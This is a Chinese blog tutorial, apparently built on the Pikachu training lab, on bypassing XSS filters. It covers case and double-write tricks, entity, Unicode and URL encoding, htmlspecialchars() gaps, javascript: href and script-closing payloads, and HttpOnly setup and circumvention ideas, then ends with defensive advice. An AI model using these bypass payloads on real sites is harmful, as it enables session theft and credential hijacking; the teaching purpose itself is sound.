class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class"><span class="title">include_once</span> $<span class="title">PIKA_ROOT_DIR</span>.&#x27;<span class="title">footer</span>.<span class="title">php</span>&#x27;;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>其中“$message&#x3D;preg_replace(‘&#x2F;&lt;(.<em>)s(.</em>)c(.<em>)r(.</em>)i(.<em>)p(.</em>)t&#x2F;‘, ‘’, $_GET[‘message’]);”是对小写的script进行过滤，此时我们可以用大写或大小写混合或其他标签的方式进行绕过。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT&gt;<span class="title function_ invoke__">alert</span>(<span class="string">&#x27;xss&#x27;</span>)&lt;/SCRIPT&gt;  或 &lt;img src=<span class="comment"># onerror=&quot;alert(&#x27;xss&#x27;)&quot;/&gt; </span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps110.jpg" alt="img"> </p>
<p>其中“$message&#x3D;str_ireplace(‘<script>',$_GET['message']);”是对<script>整体进行了过滤不区分大小写，我们可以使用双写或其他标签进行绕过。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;sc&lt;script&gt;ript&gt;<span class="title function_ invoke__">alert</span>(‘xss’)&lt;/sc&lt;script&gt;ript&gt; 或 &lt;img src=<span class="comment"># onerror=&quot;alert(&#x27;xss&#x27;)&quot;/&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps111.jpg" alt="img"> </p>
<h4 id="5-2-2-编码绕过"><a href="#5-2-2-编码绕过" class="headerlink" title="5.2.2 编码绕过"></a><strong>5.2.2 编码绕过</strong></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span>head&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;content&quot;</span>&gt;</span></span><br><span class="line"><span class="symbol">&amp;lt;</span><span class="symbol">&amp;gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>思路:后台有可能会对代码中的关键字进行过滤，但我们可以尝试将关键字进行编码后在插入，浏览器对改编码进行识别时，会翻译成正常的代码。(注意:编码在输出时是否会被正常识别和翻译才是关键，不是所有的编码都是可以的，所以需要研究浏览器到底能够将哪些编码数据能够正常解码显示)，大家理解思路即可。到底浏览器能不能解析，谁也不能保准，因为浏览器也一直在升级，解析规则可能会发生变化。</p>
<p>浏览器解析顺序是这样的，URL解析器，HTML解析器，CSS解析器，JS解析器URL的解码是在后台服务检测之前的，可以理解为后台收到URL后会自动进行解码，</p>
<p>然后才是执行开发人员编写的对URL中的值的检测函数，首先URL编码作用不在于绕过后台检测，但是当我们是GET方式提交数据时，而我们提交的数据中进行了实体编码，也就意味着存在&，#这样的特殊字符，这时就需要对这些特殊字符进行URL编码，这样才会保证正常解析，如果不进行URL编码的话，就会把+认为是空格了，而&也会是被认为用来连接URL中参数的连接符，故需要进行URL编码。如果是以POST方式传递值，就不需要进行URL编码了。CSS解析器是用来解析CSS代码的。</p>
<p>我们重点看的是:</p>
<p>html实体编码（HTML解析器）&#十进制;或者&#x十六进制;</p>
<p>JS编码（JS解析器）\u00十六进制，也就是unicode编码。</p>
<p>html相关的几种编码方式:</p>
<p><em><strong>*1、html实体编码*</strong></em></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="comment"># onerror=&quot;alert(&#x27;xss &#x27;)&quot; /&gt; --&gt;&lt;img src=# onerror=&quot;a1ert(&#x27;jaden &#x27; )&quot; /&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>2、</strong><em><strong>*使用十进制的ASCLL编码;格式:以符号*</strong></em><em><strong>*&#*</strong></em><em><strong>*开头，分号*</strong></em><em><strong>*;*</strong></em><em><strong>*结尾*</strong></em></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps112.jpg" alt="img"> </p>
<p>在线工具:</p>
<p><a target="_blank" rel="noopener" href="https://coding.tools/cn/ascii-to-hex">https://coding.tools/cn/ascii-to-hex</a></p>
<p><a target="_blank" rel="noopener" href="https://tool.chinaz.com/Tools/unicode.aspx">https://tool.chinaz.com/Tools/unicode.aspx</a></p>
<p>3、unicode编码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps113.jpg" alt="img"> </p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps114.jpg" alt="img"> </p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps115.jpg" alt="img"> </p>
<h3 id="5-2-3-XSS绕过之htmlspecialchars-函数"><a href="#5-2-3-XSS绕过之htmlspecialchars-函数" class="headerlink" title="5.2.3 XSS绕过之htmlspecialchars()函数"></a>5.2.3 XSS绕过之htmlspecialchars()函数</h3><p>php里面的htmlspecialchars()函数把一些预定义字符转换为HTML实体，从而导致提交的script标签再输出的时候变成了&ltscript>，如下图所示：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps116.jpg" alt="img"> </p>
<p>预定义字符编码如下：</p>
<p>&(和号)成为&</p>
<p>”(双引号)成为"</p>
<p>’(单引号)成为'</p>
<p><(小于)成为&1t;</p>
<p>&gt;(大于)成为>;</p>
<p>Html实体编码表：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaofoyuan/archive/2013/01/15/2860815.html">https://www.cnblogs.com/xiaofoyuan/archive/2013/01/15/2860815.html</a></p>
<p>该函数的语法: htmlspecialchars(string,flags,character-set,double_encode)</p>
<p>过滤原理: htmlspecialchars()函数把预定义的字符转换为HTML实体，从而使XSS攻击失效。但是这个函数默认配置不会将单引号和双引号过滤，只有设置了quotestyle规定如何编码单引号和双引号才能会过滤掉单引号</p>
<p>可用的quotestyle类型:</p>
<p>ENT_COMPAT-默认。仅编码双引号，也就是默认情况下不对单引号进行处理</p>
<p>ENT_QUOTES-编码双引号和单引号</p>
<p>ENT_NOQUOTES-不编码任何引号</p>
<p>如果程序员在开发的时候，只是采用了htmlspecialchars()函数的默认配置，那么就可以使用'onclick='alert(1111)'进行绕过，源代码如下所示：</p>
<p>$message=htmlspecialchars($_GET['message']);</p>
<p> <img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps117.jpg" alt="img"></p>
<h4 id="5-2-4-XSS之href输出"><a href="#5-2-4-XSS之href输出" class="headerlink" title="5.2.4 XSS之href输出"></a><strong>5.2.4 XSS之href输出</strong></h4><p>代码中htmlspecialchars()函数采用了“ENT_QUOTES-编码双引号和单引号”，如下所示：</p>
<p>$message=htmlspecialchars($_GET['message'],ENT_QUOTES);</p>
<p>此是我们再按以前的方法就不能绕过了，我们可以输入“javascript:alert(123)”进行绕过，如下所示：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps118.jpg" alt="img"> </p>
<p>但是这里还是有个突破方法，代码将输入的数据放入到了a标签中，{Snessage]后面有个单引号，这样就能想办法执行我们的代码了。</p>
<p>看一下编码处理：</p>
<p>javascript:alert(123)  正常</p>
<p>javascript:alert('xss')  正常</p>
<p>javascript:alert(/xss/)  正常</p>
<p><strong>l</strong> <em><strong>*对alert中的内容进行unicode编码(中文转Unicode)，也就是所谓的js编码*</strong></em> </p>
<p>javascript:alert(\u0031\u0032\u0033)  不需要引号的数字弹框时，编码之后不能弹框</p>
<p>javascript:alert('\u0078\u0073\u0073') 外层是单引号时，内容可以解析，并且有弹框</p>
<p>javascript:alert(/u0078\u0073\u0073/) 外层是/时，内容不能解析，但可以弹框</p>
<p><strong>l</strong> <em><strong>*对alert中的内容进行html实体编码（ascii十进制编码*</strong></em><em><strong>*【unicode转ascii】*</strong></em><em><strong>*）+URL编码*</strong></em><em><strong>*【urlencode】*</strong></em></p>
<p>javascript:alert(%26%2349%3B%26%2350%3B%26%2351%3B)  不需要引号的数字弹框时，编码之后不能弹框</p>
<p>javascript:alert('%26%23120%3B%26%23115%3B%26%23115%3B') 外层是单引号时，内容不能解析但能弹框</p>
<p>javascript:alert(/%26%23120%3B%26%23115%3B%26%23115%3B/) 外层是/时，内容不能解析但能弹框</p>
<p><strong>l</strong> <em><strong>*对整体进行html实体编码（ascii十进制编码*</strong></em><em><strong>*【unicode转ascii】*</strong></em><em><strong>*）+URL编码*</strong></em><em><strong>*【urlencode】*</strong></em><em><strong>*，不能解析*</strong></em></p>
<p>%26%23106%3B%26%2397%3B%26%23118%3B%26%2397%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2358%3B%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B%26%2340%3B%26%2339%3B%26%23120%3B%26%23115%3B%26%23115%3B%26%2339%3B%26%2341%3B</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps119.jpg" alt="img"> </p>
<h4 id="5-2-5-XSS之js输出"><a href="#5-2-5-XSS之js输出" class="headerlink" title="5.2.5 XSS之js输出"></a><strong>5.2.5 XSS之js输出</strong></h4><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps120.jpg" alt="img"> </p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps121.jpg" alt="img"> </p>
<p>构建XSS攻击代码：'xss'</script><script>alert('xss')</script></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps122.jpg" alt="img"> </p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps123.jpg" alt="img"> </p>
<p>前面的代码被</script>闭合了，后面写了新的script标签内容，从而导致弹窗。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps124.jpg" alt="img"> </p>
<h4 id="5-2-6-XSS之httponly绕过"><a href="#5-2-6-XSS之httponly绕过" class="headerlink" title="5.2.6 XSS之httponly绕过"></a><strong>5.2.6 XSS之httponly绕过</strong></h4><h4 id="5-2-6-1-什么是httponly"><a href="#5-2-6-1-什么是httponly" class="headerlink" title="5.2.6.1 什么是httponly"></a><strong>5.2.6.1 什么是httponly</strong></h4><p>XSS攻击手段获取cookie.</p>
<p>Httponly是包含在http响应头Set-Cookie里面的一个附加的标识，所以它是后端服务器对cookie设置的一个附加的属性，在生成cookie时使用Httponly标志有助于减轻客户端脚本访问受保护cookie的风险(如果浏览器支持的话)，大多数xSS攻击都是针对会话cookie的盗窃。后端服务器可以通过在其创建的cookie上设置HttpOnly标志来帮助缓解此问题，这表明该cookie在客户端上不可访问。如果支持HttpOnly的浏览器检测到包含HttpOnly标志的cookie，并且客户端脚本代码尝试读取该cookie，则浏览器将返回一个空字符串作为结果。这会通过阻止恶意代码(通常是XSS）将数据发送到攻击者的网站来使攻击失败。</p>
<p>如果HTTP响应标头中包含Httponly标志(可选)，客户端脚本将无法访问cookie(如果浏览器支持该标志的话)。因此即使客‘端存在跨站点脚本(XSS)漏洞，浏览器也不会将Cookie透露给第三方。</p>
<p>但是如果浏览器不支持HttpOnly，并且后端服务器设置了HttpOnly cookie，浏览器也会忽略Httponly标志，从而创建传统的，脚本可访问的cookie。那么该cookie(通常是会话cookie)容易受到XSS攻击。<strong>这里大家要注意一个问题，httponly不是防止xss攻击的而是防止xss攻击代码中的js代码在浏览器上获取cookie信息。</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps125.jpg" alt="img"> </p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps126.jpg" alt="img"> </p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps127.jpg" alt="img"> </p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps128.jpg" alt="img"> </p>
<p>如果设置httponly后，就可以防止盗取cookie的恶意代码执行，设置方法如下：</p>
<p>（1）确定httponly字段的位置</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps129.jpg" alt="img"> </p>
<p>（2）修改pikachu\vul\xss\xsspost目录下的post_login.php文件的源代码如下：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps130.jpg" alt="img"> </p>
<p>（3）设置完成后重新登录，查看httponly已经被设置，并且不能获取cookie了。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps131.jpg" alt="img"> </p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps132.jpg" alt="img"> </p>
<h4 id="5-2-6-2-各语言设置cookie的httponly"><a href="#5-2-6-2-各语言设置cookie的httponly" class="headerlink" title="5.2.6.2 各语言设置cookie的httponly"></a><strong>5.2.6.2 各语言设置cookie的httponly</strong></h4><p><strong>l</strong> <em><strong>*JAVA添加httponly属性:*</strong></em><br>javaee4、javaee5：没有httponly这个属性的，需要手动添加。</p>
<p>javaee6.0：</p>
<p>Cookie.setHttpOnly(true);</p>
<p><strong>l</strong> <em><strong>*php添加httponly属性:*</strong></em></p>
<p>php5.1以前的版本，只能通过header添加：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>header(<span class="string">&quot;Set_Cookie: hidden=value ; httpOnly&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>l</strong> <em><strong>*对于php5.2以上版本HttpOnly参数的设置*</strong></em></p>
<p>-——————————————————————————————————————————–</p>
<p><em><strong>*方法一：在php.ini中*</strong></em></p>
<p> session.cookie_httponly &#x3D; </p>
<p>设置其值为1或者TRUE，来开启全局的Cookie的HttpOnly属性</p>
<p>-——————————————————————————————————————————–</p>
<p>方法二：在代码中来开启： </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"> <span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;session.cookie_httponly&quot;</span>, <span class="number">1</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">// or</span></span><br><span class="line"></span><br><span class="line"> <span class="title function_ invoke__">session_set_cookie_params</span>(<span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">TRUE</span>); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>-——————————————————————————————————————————–</p>
<p>方法三：Cookie操作函数setcookie函数和setrawcookie函数也专门添加了第7个参数来做为HttpOnly的选项，开启方法为： </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">setcookie(&quot;abc&quot;, &quot;test&quot;, NULL, NULL, NULL, NULL, TRUE); </span><br><span class="line"></span><br><span class="line">setrawcookie(&quot;abc&quot;, &quot;test&quot;, NULL, NULL, NULL, NULL, TRUE);</span><br></pre></td></tr></table></figure>

<h4 id="5-2-6-3-绕过httponly"><a href="#5-2-6-3-绕过httponly" class="headerlink" title="5.2.6.3 绕过httponly"></a><strong>5.2.6.3 绕过httponly</strong></h4><p>参考文档：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_62808713/article/details/129822691">https://blog.csdn.net/weixin_62808713/article/details/129822691</a></p>
<p>我们登录后台有两种方式：</p>
<p>（1）直接用户名和密码登录方式。</p>
<p>（2）通过cookie、token等认证信息直接登录。大多数XSS攻击都是针对会话cookie的盗窃。</p>
<p>当用户通过用户名和密码登录某网站之后，浏览器可能会提示他保存用户名和密码，那么用户为了方便，很有可能点击了保存。如果是这种情况的话，我们可以想办法来读取浏览器保存的用户名和密码信息。如果用户登录之后没有保存那么我们可以采用表单劫持的方法来获取用户名和密码。</p>
<p><strong>方法一：表单劫持（用户登录后未保存登录密码）</strong></p>
<p>表单劫持的前提条件是<strong>登录页面存在存储型xss漏洞</strong>，我们先通过这个xss漏洞注入我们的xss攻击代码，攻击代码中包含获取表单数据并发送给攻击者网站的能力，然后当其他用户访问登录页面的时候，我们的xss攻击代码被加载执行了，当用户输入完用户名和密码点击提交的时候，给网站后台发送了请求的同时也给攻击者发送了用户名和密码，当然，也可以通过js的键盘记录监控来获取用户输入的用户名和密码。</p>
<p>表单劫持的前提条件其实就不好满足，所以表单劫持的这种手法比较鸡肋。</p>
<p><strong>方法二：获取浏览器保存的密码（用户登录后保存了登录密码）</strong></p>
<p>查看浏览器保存的登录密码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps133.jpg" alt="img"> </p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps134.jpg" alt="img"> </p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps135.jpg" alt="img"> </p>
<h2 id="六、XSS常规防范"><a href="#六、XSS常规防范" class="headerlink" title="六、XSS常规防范"></a>六、<strong>XSS常规防范</strong></h2><p><strong>XSS防御的总体思路:</strong></p>
<p>l 对用户的输入(和URL参数)进行过滤：就是对用户提交的所有内容进行过滤，对url中的参数进行过滤，过滤掉会导致脚本执行的相关内容。如特殊符号必须过滤掉，单引号、双引号、尖括号之类的。对输入的内容进行过滤，可以分为黑名单过滤和白名单过滤。黑名单过滤虽然可以拦截大部分的XSS攻击，但是还是存在被绕过的风险。白名单过滤虽然可以基本杜绝XSS攻击，但是真实环境中一般是不能进行如此严格的白名单过滤的。</p>
<p>l 对输出进行编码过滤:就是通过函数，将用户的输入的数据进行html编码，使其不能作为脚本运行。根据业务需求进行过滤，比如输出点要求输入手机号，则只允订输入手机号格式的数字。</p>
<p>l 转义︰所有输出到前端的数据都根据输出点进行转义，比如输出到html中讲行html实体转义，输入到js里面的讲行js转义。</p>
<p>xss之href输出绕过:javascript:alert(1111)，直接代入a标签herf里面一样可以绕过htmlspecialchars，如果没有杷用户提交的数据交给a标签，其实很难绕过了。</p>
<p>xss之js输出绕过：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps136.jpg" alt="img"> </p>
<p>l 还可以在服务端设置会话Cookie的HTTP Only属性，这样，客户端的JS脚本就不能获取Cookie信息了。</p>
<p><em><strong>*XSS漏洞的*</strong></em><em><strong>*修复总结*</strong></em><em><strong>*：*</strong></em></p>
<p>因为XSS漏洞涉及输入和输出两部分，所以其修复也分两种：</p>
<p>l A:过滤输入的数据，包括” ‘ ”,” “ ”,”&lt;”,”&gt;” “on*”等非法字符。</p>
<p>l B:对输出到页面的数据进行相应的编码转换，包括HTML实体编码、JavaScript编码等。</p>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./assets/lbxw.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./assets/lbxw.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">蜡笔小王</div><div class="post-copyright__author_desc">不想学习啊！！！</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="https://wjh0527.github.io.git/2025/09/12/xss/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('https://wjh0527.github.io.git/2025/09/12/xss/')">xss</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"><div class="post-reward" onclick="anzhiyu.addRewardMask()"><div class="reward-button button--animated" title="赞赏作者"><i class="anzhiyufont anzhiyu-icon-hand-heart-fill"></i>打赏作者</div><div class="reward-main"><div class="reward-all"><span class="reward-title">感谢你赐予我前进的力量</span><ul class="reward-group"><li class="reward-item"><a href="/null" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/null" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/null" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/null" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul><a class="reward-main-btn" href="/about/#about-reward" target="_blank"><div class="reward-text">赞赏者名单</div><div class="reward-dec">因为你们的支持让我意识到写文章的价值🙏</div></a></div></div></div><div id="quit-box" onclick="anzhiyu.removeRewardMask()" style="display: none"></div></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="https://wjh0527.github.io.git/2025/09/12/xss/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=xss&amp;url=https://wjh0527.github.io.git/2025/09/12/xss/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://wjh0527.github.io.git" target="_blank">蜡笔小王的博客</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/%E6%BC%8F%E6%B4%9E/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>漏洞<span class="tagsPageCount">8</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="/./assets/lbxw.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link 